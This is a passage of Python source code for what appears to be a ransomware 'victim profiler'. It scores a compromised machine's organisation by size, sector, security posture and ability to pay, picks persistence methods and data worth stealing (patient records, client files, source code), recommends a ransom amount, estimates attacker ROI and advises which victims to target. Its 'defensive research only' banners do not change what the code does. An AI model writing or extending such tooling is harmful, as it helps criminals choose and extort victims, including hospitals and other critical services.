        shares = self.profile_data.get('network_info', {}).get('network_shares', [])
        admin_shares = ['ADMIN$', 'C$', 'IPC$']
        
        for share in shares:
            if share.get('name') in admin_shares:
                lateral_movement['admin_shares_available'] = True
                break
        
        return lateral_movement
    
    def _assess_persistence_opportunities(self) -> List[str]:
        """Assess persistence opportunities"""
        opportunities = []
        
        # Check system configuration
        system_info = self.profile_data.get('system_info', {})
        
        if system_info.get('user_accounts'):
            opportunities.append('Registry Run Keys')
        
        if system_info.get('domain', {}).get('domain_joined'):
            opportunities.append('Group Policy Modification')
        
        # Check for service opportunities
        security_info = self.profile_data.get('security_info', {})
        if not security_info.get('edr_solution', {}).get('detected'):
            opportunities.extend(['Service Modification', 'Scheduled Tasks', 'WMI Events'])
        
        return opportunities
    
    def _identify_exfiltration_targets(self) -> List[Dict]:
        """Identify high-value data for exfiltration"""
        targets = []
        
        # Based on business type and installed software
        business_type = self.profile_data.get('business_info', {}).get('business_type', {}).get('likely_type')
        
        target_mapping = {
            'financial': [
                {'type': 'customer_data', 'value': 'high', 'locations': ['Documents', 'Database']},
                {'type': 'transaction_data', 'value': 'critical', 'locations': ['Database', 'Logs']},
                {'type': 'compliance_reports', 'value': 'medium', 'locations': ['Documents']}
            ],
            'healthcare': [
                {'type': 'patient_records', 'value': 'critical', 'locations': ['Database', 'Documents']},
                {'type': 'medical_images', 'value': 'medium', 'locations': ['FileServer', 'PACS']},
                {'type': 'insurance_data', 'value': 'high', 'locations': ['Database']}
            ],
            'legal': [
                {'type': 'case_files', 'value': 'critical', 'locations': ['Documents', 'FileServer']},
                {'type': 'client_data', 'value': 'high', 'locations': ['Database', 'Documents']},
                {'type': 'contracts', 'value': 'medium', 'locations': ['Documents']}
            ],
            'technology': [
                {'type': 'source_code', 'value': 'critical', 'locations': ['Development', 'Git']},
                {'type': 'customer_data', 'value': 'high', 'locations': ['Database']},
                {'type': 'intellectual_property', 'value': 'critical', 'locations': ['Documents', 'Development']}
            ]
        }
        
        if business_type in target_mapping:
            targets = target_mapping[business_type]
        else:
            # Generic targets
            targets = [
                {'type': 'documents', 'value': 'medium', 'locations': ['Documents']},
                {'type': 'email', 'value': 'medium', 'locations': ['Exchange', 'PST']},
                {'type': 'credentials', 'value': 'high', 'locations': ['Browser', 'KeyChain']}
            ]
        
        return targets
    
    def _assess_victim_value(self) -> Dict:
        """Comprehensive victim value assessment"""
        value_assessment = {
            'overall_score': 0.0,
            'tier_classification': 'low_value',
            'payment_likelihood': 0.0,
            'recommended_ransom': 0,
            'attack_complexity': 'medium',
            'roi_estimate': 0.0
        }
        
        # Scoring components
        scores = {
            'organization_size': self._score_organization_size(),
            'business_type': self._score_business_type(),
            'financial_capacity': self._score_financial_capacity(),
            'security_posture': self._score_security_posture(),
            'data_sensitivity': self._score_data_sensitivity(),
            'attack_surface': self._score_attack_surface()
        }
        
        # Weighted overall score
        weights = {
            'organization_size': 0.25,
            'business_type': 0.15,
            'financial_capacity': 0.25,
            'security_posture': 0.15,
            'data_sensitivity': 0.10,
            'attack_surface': 0.10
        }
        
        overall_score = sum(scores[factor] * weights[factor] for factor in scores)
        value_assessment['overall_score'] = overall_score
        
        # Tier classification
        if overall_score >= 0.8:
            value_assessment['tier_classification'] = 'critical_infrastructure'
        elif overall_score >= 0.7:
            value_assessment['tier_classification'] = 'large_enterprise'
        elif overall_score >= 0.5:
            value_assessment['tier_classification'] = 'medium_enterprise'
        elif overall_score >= 0.3:
            value_assessment['tier_classification'] = 'small_business'
        else:
            value_assessment['tier_classification'] = 'individual'
        
        # Payment likelihood and ransom recommendation
        tier_info = self.value_tiers[value_assessment['tier_classification']]
        value_assessment['recommended_ransom'] = tier_info['max_payment']
        value_assessment['payment_likelihood'] = min(overall_score * 1.2, 1.0)
        
        # ROI estimate
        attack_cost = 1000  # Assumed attack cost
        expected_payment = value_assessment['recommended_ransom'] * value_assessment['payment_likelihood']
        value_assessment['roi_estimate'] = (expected_payment - attack_cost) / attack_cost
        
        return value_assessment
    
    def _score_organization_size(self) -> float:
        """Score based on organization size"""
        org_size = self.profile_data.get('business_info', {}).get('organization_size', {}).get('estimated_size', 'individual')
        
        size_scores = {
            'individual': 0.1,
            'small_business': 0.3,
            'medium_enterprise': 0.6,
            'large_enterprise': 0.8,
            'very_large_enterprise': 1.0
        }
        
        return size_scores.get(org_size, 0.1)
    
    def _score_business_type(self) -> float:
        """Score based on business type"""
        business_type = self.profile_data.get('business_info', {}).get('business_type', {}).get('likely_type', 'general')
        
        type_scores = {
            'government': 1.0,
            'financial': 0.9,
            'healthcare': 0.8,
            'critical_infrastructure': 1.0,
            'technology': 0.7,
            'legal': 0.6,
            'manufacturing': 0.5,
            'education': 0.4,
            'retail': 0.3,
            'general_business': 0.2
        }
        
        return type_scores.get(business_type, 0.2)
    
    def _score_financial_capacity(self) -> float:
        """Score based on financial capacity"""
        payment_capacity = self.profile_data.get('financial_info', {}).get('payment_capacity', {})
        max_payment = payment_capacity.get('estimated_max_payment', 0)
        
        # Normalize to 0-1 scale based on payment tiers
        if max_payment >= 1000000:
            return 1.0
        elif max_payment >= 100000:
            return 0.8
        elif max_payment >= 10000:
            return 0.6
        elif max_payment >= 1000:
            return 0.4
        elif max_payment >= 100:
            return 0.2
        else:
            return 0.1
    
    def _score_security_posture(self) -> float:
        """Score based on security posture (lower security = higher score for attacker)"""
        security_info = self.profile_data.get('security_info', {})
        
        # Invert security strength for attacker perspective
        security_score = 1.0
        
        if security_info.get('antivirus', {}).get('detected'):
            security_score -= 0.2
        
        if security_info.get('edr_solution', {}).get('detected'):
            security_score -= 0.3
        
        if security_info.get('firewall', {}).get('windows_firewall_enabled'):
            security_score -= 0.1
        
        if security_info.get('backup_solutions', {}).get('backup_running'):
            security_score -= 0.2
        
        patch_level = security_info.get('patch_level', {}).get('pending_updates', 0)
        if patch_level > 10:
            security_score += 0.2  # Many pending updates = higher attack score
        
        return max(security_score, 0.0)
    
    def _score_data_sensitivity(self) -> float:
        """Score based on data sensitivity"""
        data_sensitivity = self.profile_data.get('business_info', {}).get('data_sensitivity', {})
        
        sensitivity_level = data_sensitivity.get('overall_sensitivity', 'low')
        
        sensitivity_scores = {
            'low': 0.2,
            'medium': 0.5,
            'high': 0.8,
            'critical': 1.0
        }
        
        return sensitivity_scores.get(sensitivity_level, 0.2)
    
    def _score_attack_surface(self) -> float:
        """Score based on attack surface complexity"""
        attack_surface = self.profile_data.get('attack_surface', {})
        
        score = 0.0
        
        # Network exposure
        network_exposure = attack_surface.get('network_exposure', {})
        if network_exposure.get('internet_facing_services'):
            score += 0.3
        
        # Vulnerabilities
        vulnerabilities = attack_surface.get('software_vulnerabilities', [])
        if vulnerabilities:
            score += min(len(vulnerabilities) * 0.1, 0.4)
        
        # Lateral movement
        lateral_movement = attack_surface.get('lateral_movement_opportunities', {})
        if lateral_movement.get('domain_joined'):
            score += 0.3
        
        return min(score, 1.0)
    
    def _calculate_targeting_priority(self) -> Dict:
        """Calculate overall targeting priority and recommendations"""
        value_assessment = self.profile_data.get('value_assessment', {})
        
        overall_score = value_assessment.get('overall_score', 0.0)
        tier_classification = value_assessment.get('tier_classification', 'individual')
        
        if overall_score >= 0.8:
            priority = 'critical'
            recommendation = 'Immediate targeting recommended - high value, high success probability'
        elif overall_score >= 0.6:
            priority = 'high'
            recommendation = 'Priority target - good balance of value and success probability'
        elif overall_score >= 0.4:
            priority = 'medium'
            recommendation = 'Consider targeting if resources available'
        elif overall_score >= 0.2:
            priority = 'low'
            recommendation = 'Low priority - limited value or high difficulty'
        else:
            priority = 'skip'
            recommendation = 'Skip - insufficient value or extremely high difficulty'
        
        return {
            'priority_level': priority,
            'recommendation': recommendation,
            'confidence': value_assessment.get('payment_likelihood', 0.0),
            'estimated_roi': value_assessment.get('roi_estimate', 0.0)
        }


# Example usage for defensive research
if __name__ == "__main__":
    print("[+] Starting Advanced Victim Profiling System")
    print("[!] This tool is for defensive cybersecurity research only")
    print("[!] Use in controlled, authorized environments only")
    
    # Create profiler instance
    profiler = AdvancedVictimProfiler()
    
    # Generate comprehensive profile
    profile = profiler.generate_comprehensive_profile()
    
    # Display key findings
    print("\n" + "="*80)
    print("VICTIM PROFILE ANALYSIS RESULTS")
    print("="*80)
    
    # System info
    system_info = profile.get('system_info', {})
    print(f"Target System: {system_info.get('hostname', 'Unknown')}")
    print(f"Domain: {system_info.get('domain', {}).get('domain_name', 'Workgroup')}")
    print(f"OS: {system_info.get('os_info', {}).get('name', 'Unknown')} {system_info.get('os_info', {}).get('version', '')}")
    
    # Business context
    business_info = profile.get('business_info', {})
    org_size = business_info.get('organization_size', {}).get('estimated_size', 'Unknown')
    business_type = business_info.get('business_type', {}).get('likely_type', 'Unknown')
    print(f"Organization Size: {org_size}")
    print(f"Business Type: {business_type}")
    
    # Value assessment
    value_assessment = profile.get('value_assessment', {})
    print(f"\nValue Score: {value_assessment.get('overall_score', 0):.2f}/1.00")
    print(f"Tier Classification: {value_assessment.get('tier_classification', 'Unknown')}")
    print(f"Recommended Ransom: ${value_assessment.get('recommended_ransom', 0):,}")
    print(f"Payment Likelihood: {value_assessment.get('payment_likelihood', 0):.1%}")
    print(f"Estimated ROI: {value_assessment.get('roi_estimate', 0):.1f}x")
    
    # Targeting priority
    targeting_priority = profile.get('targeting_priority', {})
    print(f"\nTargeting Priority: {targeting_priority.get('priority_level', 'Unknown').upper()}")
    print(f"Recommendation: {targeting_priority.get('recommendation', 'No recommendation')}")
    
    # Security posture
    security_info = profile.get('security_info', {})
    av_detected = security_info.get('antivirus', {}).get('detected', False)
    edr_detected = security_info.get('edr_solution', {}).get('detected', False)
    print(f"\nSecurity Posture:")
    print(f"  Antivirus: {'Detected' if av_detected else 'Not detected'}")
    print(f"  EDR Solution: {'Detected' if edr_detected else 'Not detected'}")
    print(f"  Backup Running: {'Yes' if security_info.get('backup_solutions', {}).get('backup_running') else 'No'}")
    
    # Save comprehensive profile
    timestamp = int(time.time())
    filename = f"victim_profile_{system_info.get('hostname', 'unknown')}_{timestamp}.json"
    
    with open(filename, 'w') as f:
        json.dump(profile, f, indent=2, default=str)
    
    print(f"\n[+] Complete profile saved to: {filename}")
    print("\n[!] This profiling data is for defensive research purposes only!")
    print("[!] Use to develop better detection and prevention systems!")
